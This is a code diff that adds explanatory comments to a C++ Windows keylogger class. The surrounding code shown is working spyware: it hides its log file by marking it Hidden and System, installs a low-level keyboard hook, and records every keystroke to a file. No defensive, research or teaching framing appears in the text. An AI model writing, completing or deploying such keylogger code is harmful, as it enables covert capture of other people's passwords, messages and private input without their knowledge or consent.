@@ -10,8 +10,7 @@ KeyLogger::KeyLogger(const std::string& filename) {
     filePath = filename;
 }
 
-
-
+// Hide a file by setting its attributes to Hidden and System
 void KeyLogger::hideFile(const std::string& filename) {
         SetFileAttributesA(filename.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
     }
@@ -20,7 +19,7 @@ void KeyLogger::unhideFile(const std::string& filename) {
     SetFileAttributesA(filename.c_str(), FILE_ATTRIBUTE_NORMAL);
 }
 
-
+// Starts the keylogger hook and begins logging keys to the specified file
 void KeyLogger::start() {
     outFile.open(filePath, std::ios::app);
     if (!outFile.is_open()) return;
@@ -45,6 +44,7 @@ void KeyLogger::start() {
     outFile.close();
 }
 
+// Stops the keylogger by unhooking the keyboard hook and exiting the message loop
 void KeyLogger::stop() {
     running = false;
 
@@ -54,6 +54,7 @@ void KeyLogger::stop() {
     }
 }
 
+// Low-level keyboard hook procedure for capturing keystrokes
 LRESULT CALLBACK KeyLogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
         KBDLLHOOKSTRUCT* kbStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
@@ -131,11 +132,9 @@ LRESULT CALLBACK KeyLogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam
                 default:
                     outFile << "[UNK:" << vkCode << "]"; break;
             }
-
             outFile.flush();
         }
     }
-
     return CallNextHookEx(nullptr, nCode, wParam, lParam);
 }
 
